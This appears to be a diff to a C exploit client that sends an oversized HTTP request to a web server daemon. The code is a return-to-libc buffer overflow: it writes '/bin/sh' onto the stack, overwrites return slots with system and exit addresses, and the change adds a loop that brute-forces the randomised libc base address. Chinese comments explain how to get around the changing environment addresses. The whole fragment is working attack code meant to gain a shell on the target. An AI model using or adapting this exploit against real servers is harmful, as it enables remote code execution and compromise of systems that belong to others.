@@ -45,7 +45,7 @@ int browser(int port,int stringaddr);
    int port=PORT,addr=0xbf89ba38;
   // printf("%x\n",&port);
    if(argc>1) port=atoi(argv[1]);
- // for(addr=0xbfdbf8d8;addr<=0xc0000000;addr++)
+  for(addr=0xb7000060;addr<=0xb7fff060;addr=addr+0x00001000)
  //httpd的环境变量地址每次都在变，不可能通过暴力破解来猜到/bin/bash的地址
  //所以我们要把system的参数放在栈中，重生的栈地址不变，只有在第一次创建进程时栈地址不可预测
         browser(port,addr);
@@ -86,9 +86,9 @@ for(i=0;i<1060;i++)
      uri[i++]='h';//将/bin/sh写入栈中，作为system的参数
      uri[i]  ='\0';
 }
-	 addr_s[265]=0xb7648060;//0xb7e5f060;      //system的地址
-	 addr_s[266]=0xb763bbe0;      //exit的地址
-         addr_s[267]= stringaddr;     //system的地址参数的地址0xbffff591 是台式机上虚拟机的地址
+	 addr_s[265]=stringaddr;//0xb7e5f060;      //system的地址
+	 addr_s[266]=stringaddr-(0xb75b2060-0xb75a5be0);      //exit的地址
+         addr_s[267]=stringaddr-(0xb75b2060-0xb76d3c58);     //system的地址参数的地址0xbffff591 是台式机上虚拟机的地址
      	 uri[1073]='\0';
          uri[1072]=' ';
          write(sock_client,uri,1073);    
